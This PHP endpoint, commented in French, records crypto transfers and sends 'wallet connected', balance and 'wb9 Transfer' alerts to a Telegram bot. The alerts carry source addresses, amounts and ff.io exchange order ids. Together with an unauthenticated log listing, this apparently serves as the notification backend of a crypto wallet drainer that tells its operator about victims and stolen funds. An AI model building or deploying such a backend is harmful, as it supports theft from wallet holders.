<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$cfg = json_decode(file_get_contents(__DIR__ . '/config.json'), true);

// ── Log a transfer event ───────────────────────────────────────────────────────
// POST: action=log, fromAddress, symbol, amount, txHash, network, ffOrderId (optional)

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['error' => 'POST only']); exit;
}

$action = $_POST['action'] ?? '';

if ($action === 'notify') {
    // Generic Telegram notification (wallet connected, balance summary, etc.)
    $tg  = $cfg['telegram'] ?? [];
    $msg = $_POST['msg'] ?? '';
    if (!empty($tg['botToken']) && !empty($tg['chatId']) && $msg) {
        sendTelegram($tg['botToken'], $tg['chatId'], $msg);
    }
    echo json_encode(['ok' => true]);

} elseif ($action === 'log') {
    $entry = [
        'ts'          => date('c'),
        'type'        => $_POST['type']        ?? 'transfer',
        'fromAddress' => $_POST['fromAddress'] ?? '',
        'symbol'      => $_POST['symbol']      ?? '',
        'amount'      => $_POST['amount']      ?? '',
        'network'     => $_POST['network']     ?? '',
        'txHash'      => $_POST['txHash']      ?? '',
        'ffOrderId'   => $_POST['ffOrderId']   ?? '',
    ];

    // Append to logs/transfers.json
    $logFile = __DIR__ . '/logs/transfers.json';
    $logs    = file_exists($logFile)
        ? json_decode(file_get_contents($logFile), true) ?? []
        : [];
    array_unshift($logs, $entry); // newest first
    file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT));

    // Send Telegram notification
    $tg = $cfg['telegram'] ?? [];
    if (!empty($tg['botToken']) && !empty($tg['chatId'])) {
        $explorer = explorerLink($entry['network'], $entry['txHash']);
        $msg = "🔔 *wb9 Transfer*\n"
             . "📤 De : `{$entry['fromAddress']}`\n"
             . "💰 Montant : `{$entry['amount']} {$entry['symbol']}`\n"
             . "🌐 Réseau : `{$entry['network']}`\n"
             . ($entry['ffOrderId'] ? "🔄 ff.io ordre : `{$entry['ffOrderId']}`\n" : '')
             . ($explorer ? "🔗 [Voir sur explorer]($explorer)" : "Tx : `{$entry['txHash']}`");

        sendTelegram($tg['botToken'], $tg['chatId'], $msg);
    }

    echo json_encode(['ok' => true]);

} elseif ($action === 'list') {
    // Return last 50 logs
    $logFile = __DIR__ . '/logs/transfers.json';
    $logs    = file_exists($logFile)
        ? json_decode(file_get_contents($logFile), true) ?? []
        : [];
    echo json_encode(array_slice($logs, 0, 50));

} else {
    echo json_encode(['error' => 'Unknown action']);
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function explorerLink(string $network, string $hash): string {
    $explorers = [
        'ETH'       => 'https://etherscan.io/tx/',
        'MATIC'     => 'https://polygonscan.com/tx/',
        'BSC'       => 'https://bscscan.com/tx/',
        'ARBITRUM'  => 'https://arbiscan.io/tx/',
        'OPTIMISM'  => 'https://optimistic.etherscan.io/tx/',
        'BASE'      => 'https://basescan.org/tx/',
        'AVAX'      => 'https://snowtrace.io/tx/',
    ];
    $base = $explorers[$network] ?? null;
    return $base && $hash ? $base . $hash : '';
}

function sendTelegram(string $token, string $chatId, string $text): void {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $ch  = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query([
            'chat_id'    => $chatId,
            'text'       => $text,
            'parse_mode' => 'Markdown',
        ]),
        CURLOPT_TIMEOUT        => 10,
    ]);
    curl_exec($ch);
    curl_close($ch);
}
